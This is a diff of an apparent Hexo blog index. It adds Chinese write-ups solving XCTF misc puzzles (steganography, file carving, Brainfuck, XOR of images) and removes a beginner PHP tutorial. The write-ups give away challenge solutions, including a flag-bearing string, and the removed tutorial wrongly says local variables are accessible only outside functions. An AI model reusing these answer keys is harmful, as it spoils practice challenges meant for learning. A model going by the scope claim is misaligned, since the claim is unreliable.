+<p>最后一段看起来像极了base64，/+.. 这几个符号看起来又不太对劲，好了我没辙了（围观wp ing）</p>
+<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210401205332585.png"></p>
+<p>这个提示我这没有啊，没有啊，没有啊。。。。。。。</p>
+<p>之后继续解下去就好了</p>
+<h1 id="simple-transfer"><a href="#simple-transfer" class="headerlink" title="simple_transfer"></a>simple_transfer</h1><p>我以为这是一道朴实无华的流量分析题，然后我在流量包里找flag。。。。。。。。。</p>
+<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210402214833805.png"></p>
+<p>什么都没捞到，flag在哪，分离看看</p>
+<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210402215121906.png"></p>
+<p>有个pdf文件，foremost分离一下</p>
+<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210402220006179.png"></p>
+<p>打开pdf就完事</p>
+<h1 id="can-has-stdio"><a href="#can-has-stdio" class="headerlink" title="can_has_stdio?"></a>can_has_stdio?</h1><p>压缩包里是个没有后缀名的文件，用010打开</p>
+<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210408162635548.png"></p>
+<p>brainfuck，解码就可以得到flag</p>
+<h1 id="hit-the-core"><a href="#hit-the-core" class="headerlink" title="hit-the-core"></a>hit-the-core</h1><p>反正不知道是什么玩意的就010，然后看到这一串</p>
+<p>cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}</p>
+<p>很长的字符串，从第三位开始，每5位进行提取得到flag。（奇怪的知识增加了）</p>
+<h1 id="What-is-this"><a href="#What-is-this" class="headerlink" title="What-is-this"></a>What-is-this</h1><p>我是谁？我在哪？这是啥？</p>
+<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210408210530113.png"></p>
+<p>压缩包里套了一个未命名文件，嗯，还是压缩包，加上后缀后解压，得到这两张图，感觉信息量很大，但是我确实没扫出什么来</p>
+<p>新知识stegsolve原来可以合并图！！！</p>
+<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210408211111907.png"></p>
+<p>XOR 异或，好像明白了什么</p>
 ]]></content>
       <tags>
         <tag>misc</tag>
@@ -2296,71 +2432,6 @@
 <p>（这个信息隐藏在哪里啊。。。。。。。。。。。。。。。。。。。）</p>
 <p>你看看端口，3401,3400变换，量子纠缠是0和1变换，好像对应上了</p>
 <p>二进制转文本，未果</p>
-]]></content>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于PHP</title>
-    <url>/2020/10/09/%E5%85%B3%E4%BA%8EPHP/</url>
-    <content><![CDATA[<p>PHP 是一门弱类型语言，对新手来说还是很友好的。</p>
-<h2 id="PHP语法"><a href="#PHP语法" class="headerlink" title="PHP语法"></a>PHP语法</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// PHP 代码</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 这是 PHP 单行注释</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这是</span><br><span class="hljs-comment">PHP 多行</span><br><span class="hljs-comment">注释</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<h2 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h2><h3 id="变量规则"><a href="#变量规则" class="headerlink" title="变量规则"></a>变量规则</h3><p> <img src="/2020/10/09/%E5%85%B3%E4%BA%8EPHP/PHP%E5%8F%98%E9%87%8F%E8%A7%84%E5%88%99.png"></p>
-<h3 id="4种变量作用域"><a href="#4种变量作用域" class="headerlink" title="4种变量作用域"></a>4种变量作用域</h3><p>local //只能在函数之外进行访问<br>global //访问全局变量，只能在函数之外进行访问，global关键字<br>static //局部变量不被删除<br>parameter //参数，通过调用代码将值传递给函数的局部变量，在参数列表中声明，为函数声明的一部分</p>
-<h4 id="global-关键字"><a href="#global-关键字" class="headerlink" title="global 关键字"></a>global 关键字</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$x=<span class="hljs-number">5</span>;<br>$y=<span class="hljs-number">10</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myTest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">global</span> $x,$y;<br>	$y=$x+$y;<br>&#125;<br><br>myTest();<br><span class="hljs-keyword">echo</span> $y; <span class="hljs-comment">// 输出15</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<p>其中</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myTest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">global</span> $x,$y;<br>	$y=$x+$y;<br>&#125;<br><br></code></pre></td></tr></table></figure>
-<p>可改写为</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> myTest()<br>&#123;<br>    <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;y&#x27;</span>]=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;x&#x27;</span>]+<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;y&#x27;</span>]; <span class="hljs-regexp">//</span>PHP将所有全局变量存储在<span class="hljs-variable">$GLOBALS</span>（大写）[index]的数组可以在函数中内部访问，也可以直接用来更新全局变量。<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<h4 id="Static作用域"><a href="#Static作用域" class="headerlink" title="Static作用域"></a>Static作用域</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myTest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">static</span> $x=<span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">echo</span> $x;<br>	$x++;  <span class="hljs-comment">//$x++ : 是先执行 $x的值  然后在 +1；</span><br>	<span class="hljs-keyword">echo</span> PHP_EOL; <span class="hljs-comment">//换行符</span><br><br>&#125;<br><br>myTest();<br>myTest();<br>myTest();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<h4 id="参数作用域"><a href="#参数作用域" class="headerlink" title="参数作用域"></a>参数作用域</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myTest</span>(<span class="hljs-params">$x</span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">echo</span> $x;<br>&#125;<br>myTest(<span class="hljs-number">8</span>); <span class="hljs-comment">//输出8</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="局部和全局作用域"><a href="#局部和全局作用域" class="headerlink" title="局部和全局作用域"></a>局部和全局作用域</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$x=<span class="hljs-number">5</span>; <span class="hljs-comment">//全局变量</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myTest</span>(<span class="hljs-params"></span>) //<span class="hljs-title">function</span>:用于申明用户自定义函数的关键字.</span><br><span class="hljs-function"></span>&#123;<br>	$y=<span class="hljs-number">10</span>; <span class="hljs-comment">//局部变量</span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;测试函数内变量:&lt;/p&gt;&quot;</span>; <span class="hljs-comment">//&lt;p&gt;称为开始标记，&lt;/p&gt;称为结束标记。把一段话写在这两个标记中间，在用浏览器浏览的时候，浏览器会把这一段话显示为一个段落。</span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量 x 为: <span class="hljs-subst">$x</span>&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">//&lt;br&gt; 标签是空标签，可插入一个简单的换行符。</span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量 y 为: <span class="hljs-subst">$y</span>&quot;</span>;<br>&#125;<br><br>myTest();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;测试函数外变量：&lt;/p&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量 x 为: <span class="hljs-subst">$x</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量 y 为:<span class="hljs-subst">$y</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<h3 id="echo-和-print-语句"><a href="#echo-和-print-语句" class="headerlink" title="echo 和 print 语句"></a>echo 和 print 语句</h3><h4 id="echo-语句"><a href="#echo-语句" class="headerlink" title="echo 语句"></a>echo 语句</h4><p>echo 或 echo() 可输出一个至多个字符串，速度比print快，无返回值</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;PHP很有趣！&lt;/h2&gt;&quot;</span>; <span class="hljs-comment">//标题标签用于标题文本。不要仅仅为了产生粗体文本而使用它们。(h1~h6字体依次减小,为html标签)</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello world!&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;这是一个&quot;</span>,<span class="hljs-string">&quot;字符串,&quot;</span>,<span class="hljs-string">&quot;使用了&quot;</span>,<span class="hljs-string">&quot;多个&quot;</span>,<span class="hljs-string">&quot;参数。&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$txt1=<span class="hljs-string">&quot;学习PHP&quot;</span>;<br>$txt2=<span class="hljs-string">&quot;RUNOOB.COM&quot;</span>;<br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>); <span class="hljs-comment">//Array 函数允许您访问并操作数组。支持简单的数组和多维数组。</span><br><br><span class="hljs-keyword">echo</span> $txt1;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;在 <span class="hljs-subst">$txt2</span> 学习PHP&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我车的品牌是<span class="hljs-subst">&#123;$cars[0]&#125;</span>&quot;</span>; <span class="hljs-comment">//数字索引，从0开始。</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<h4 id="print语句"><a href="#print语句" class="headerlink" title="print语句"></a>print语句</h4><p>print 或 print () 仅允许输出一个字符串，返回值总为1</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;h2&gt;PHP很有趣！&lt;/h2&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello world!&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;学习php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$txt1=<span class="hljs-string">&quot;学习PHP&quot;</span>;<br>$txt2=<span class="hljs-string">&quot;RUNOOB.COM&quot;</span>;<br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br><br><span class="hljs-keyword">print</span> $txt1;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;在 <span class="hljs-subst">$txt2</span> 学习PHP&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;我车的品牌是<span class="hljs-subst">&#123;$cars[0]&#125;</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界misc-2</title>
-    <url>/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/</url>
-    <content><![CDATA[<h1 id="Aesop-secret"><a href="#Aesop-secret" class="headerlink" title="Aesop_secret"></a>Aesop_secret</h1><p>附件是一个疯狂跳动的gif，感觉有一点点像二维码，用ps修改后发现是</p>
-<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210401204948831.png"></p>
-<p>ISCC? 比赛的名称，这</p>
-<p>用010查看gif，</p>
-<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210401205032655.png"></p>
-<p>最后一段看起来像极了base64，/+.. 这几个符号看起来又不太对劲，好了我没辙了（围观wp ing）</p>
-<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210401205332585.png"></p>
-<p>这个提示我这没有啊，没有啊，没有啊。。。。。。。</p>
-<p>之后继续解下去就好了</p>
-<h1 id="simple-transfer"><a href="#simple-transfer" class="headerlink" title="simple_transfer"></a>simple_transfer</h1><p>我以为这是一道朴实无华的流量分析题，然后我在流量包里找flag。。。。。。。。。</p>
-<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210402214833805.png"></p>
-<p>什么都没捞到，flag在哪，分离看看</p>
-<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210402215121906.png"></p>
-<p>有个pdf文件，foremost分离一下</p>
-<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210402220006179.png"></p>
-<p>打开pdf就完事</p>
-<h1 id="can-has-stdio"><a href="#can-has-stdio" class="headerlink" title="can_has_stdio?"></a>can_has_stdio?</h1><p>压缩包里是个没有后缀名的文件，用010打开</p>
-<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210408162635548.png"></p>
-<p>brainfuck，解码就可以得到flag</p>
-<h1 id="hit-the-core"><a href="#hit-the-core" class="headerlink" title="hit-the-core"></a>hit-the-core</h1><p>反正不知道是什么玩意的就010，然后看到这一串</p>
-<p>cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}</p>
-<p>很长的字符串，从第三位开始，每5位进行提取得到flag。（奇怪的知识增加了）</p>
-<h1 id="What-is-this"><a href="#What-is-this" class="headerlink" title="What-is-this"></a>What-is-this</h1><p>我是谁？我在哪？这是啥？</p>
-<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210408210530113.png"></p>
-<p>压缩包里套了一个未命名文件，嗯，还是压缩包，加上后缀后解压，得到这两张图，感觉信息量很大，但是我确实没扫出什么来</p>
-<p>新知识stegsolve原来可以合并图！！！</p>
-<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210408211111907.png"></p>
-<p>XOR 异或，好像明白了什么</p>
 ]]></content>
       <tags>
         <tag>misc</tag>
